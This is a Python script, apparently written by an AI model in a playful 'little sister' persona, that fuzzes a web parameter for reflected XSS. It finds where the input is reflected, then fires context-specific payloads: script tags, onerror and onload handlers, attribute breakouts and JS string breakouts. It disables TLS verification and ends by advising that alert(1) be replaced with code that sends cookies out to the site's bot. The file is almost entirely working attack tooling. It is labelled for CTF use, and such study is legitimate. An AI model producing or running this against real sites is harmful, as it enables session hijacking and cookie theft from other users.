#!/usr/bin/env python3
"""
CTF Web XSS Fuzzer & Context Analyzer (Authorized Targets Only)
作者: 欧尼酱的专属代码小助手
目标:
1) 发送探测随机字符串，精准定位输入在 HTML 中的反射上下文。
2) 针对不同的上下文（HTML之间、属性内、JS标签内）发送特定的 Fuzz 字典。
3) 验证 Payload 是否原样存活在响应中且闭合正确。
"""

import argparse
import requests
import random
import string
import re

# 禁用安全警告
requests.packages.urllib3.disable_warnings()

class CTFXSSFuzzer:
    def __init__(self, url, method="GET", param="q", cookie=None):
        self.url = url
        self.method = method.upper()
        self.param = param
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        if cookie:
            self.session.headers.update({"Cookie": cookie})
            
        self.probe_token = "ONII" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        self.reflection_contexts = []

    def send_payload(self, payload):
        """统一发包函数"""
        try:
            if self.method == "GET":
                params = {self.param: payload}
                resp = self.session.get(self.url, params=params, timeout=5, verify=False)
            else:
                resp = self.session.post(self.url, data={self.param: payload}, timeout=5, verify=False)
            return resp.text
        except requests.RequestException as e:
            print(f"     [-] 请求异常: {e}")
            return ""

    def analyze_context(self):
        print(f"\n[+] 妹妹正在发射探测器 [{self.probe_token}] 分析参数 {self.param} 的反射点...")
        
        resp_text = self.send_payload(self.probe_token)
        
        if self.probe_token not in resp_text:
            print("[-] 诶？输入的内容没有在页面中回显，可能不是反射型/存储型 XSS，或者是盲打（无回显）的题目喵。")
            return False
            
        print(f"  [!] 发现回显！开始解析上下文环境...")
        
        # 简单正则匹配探测器周围的字符
        # 1. 检查是否在 HTML 属性中，例如 value="ONIIXXXX"
        attr_pattern = re.compile(r'([\w\-]+)\s*=\s*([\'"])[^\'"]*' + self.probe_token + r'[^\'"]*\2')
        # 2. 检查是否在 <script> 标签内
        script_pattern = re.compile(r'<script[^>]*>(.*?'+ self.probe_token +r'.*?)</script>', re.DOTALL | re.IGNORECASE)
        
        if script_pattern.search(resp_text):
            print("     [★] 发现输入点位于 <script> 标签内部！")
            self.reflection_contexts.append("script")
            
        attr_matches = attr_pattern.findall(resp_text)
        if attr_matches:
            for attr, quote in attr_matches:
                print(f"     [★] 发现输入点位于 HTML 属性中: {attr}=...，使用闭合符: {quote}")
                self.reflection_contexts.append(f"attribute_{quote}")
                
        if not self.reflection_contexts:
            print("     [★] 输入点似乎直接裸露在 HTML 文本中！(HTML Context)")
            self.reflection_contexts.append("html")

        return True

    def fuzz_xss(self):
        print(f"\n[+] 开始根据上下文进行针对性 Fuzzing 轰炸 ٩( 'ω' )و")
        
        # 定义基础 Payload 字典
        payloads_html = [
            "<script>alert(1)</script>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details/open/ontoggle=alert(1)>"
        ]
        
        # 字典结构：针对不同上下文自动加前缀/后缀闭合
        for context in set(self.reflection_contexts):
            print(f"\n  [>>>] 测试上下文: {context}")
            
            test_payloads = []
            if context == "html":
                test_payloads = payloads_html
                
            elif context.startswith("attribute_"):
                quote = context[-1] # 提取单引号或双引号
                # 姿势1：闭合属性和标签，然后另起炉灶
                test_payloads.extend([f"{quote}><script>alert(1)</script><br {quote}",
                                      f"{quote}><svg/onload=alert(1)><b {quote}"])
                # 姿势2：利用 HTML5 的 autofocus 免交互触发
                test_payloads.extend([f"{quote} autofocus onfocus={quote}alert(1)",
                                      f"{quote} onmouseover={quote}alert(1)"])
                                      
            elif context == "script":
                # 姿势1：闭合脚本标签
                test_payloads.extend(["</script><script>alert(1)</script>",
                                      "</Script><svg/onload=alert(1)>"])
                # 姿势2：闭合 JS 里的引号和分号
                test_payloads.extend(["';alert(1);//",
                                      "\";alert(1);//",
                                      "'-alert(1)-'",
                                      "\"-alert(1)-\""])

            # 开始发射
            for pl in test_payloads:
                print(f"     -> 尝试 Payload: {pl[:50]}...")
                resp = self.send_payload(pl)
                
                # 粗略验证机制：如果 Payload 原样出现在返回包中，且没有被明显转义
                if pl in resp:
                    print(f"        [!!!] 欧尼酱！Payload 原样存活！没有被转义，大概率存在 XSS！")
                elif pl.replace("<", "&lt;").replace(">", "&gt;") in resp:
                    print(f"        [-] 触发了 HTML 实体转义 (< 被转成 &lt;)，这条防线比较硬呢。")
                elif "alert" not in resp.lower():
                    print(f"        [-] alert 关键字似乎被 WAF 过滤或替换了。")

    def run(self):
        print(f"[*] XSS 目标锁定: {self.url} (Method: {self.method}, Param: {self.param})")
        if self.analyze_context():
            self.fuzz_xss()
            print("\n[+] 扫描结束！欧尼酱，如果发现有存活的 Payload，记得替换里面的 alert(1)，改成外带 Cookie 的代码给后台 Bot 吃哦！")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CTF Web XSS 自动上下文探测与 Fuzz 脚本 (By 妹妹)")
    parser.add_argument("-u", "--url", required=True, help="目标网页URL, 例如 http://127.0.0.1:8080/search")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"], help="请求方式")
    parser.add_argument("-p", "--param", required=True, help="要注入的参数名, 例如 q 或 keyword")
    parser.add_argument("-c", "--cookie", default="", help="如果需要登录，带上 Cookie")
    
    args = parser.parse_args()
    
    fuzzer = CTFXSSFuzzer(args.url, args.method, args.param, args.cookie)
    fuzzer.run()


    #如果是搜索框这种 GET 请求：
    #python ctf_xss_fuzzer.py -u "http://target-ctf.com/search.php" -m GET -p keyword

    #如果是留言板提交这种 POST 请求：
    #python ctf_xss_fuzzer.py -u "http://target-ctf.com/message.php" -m POST -p content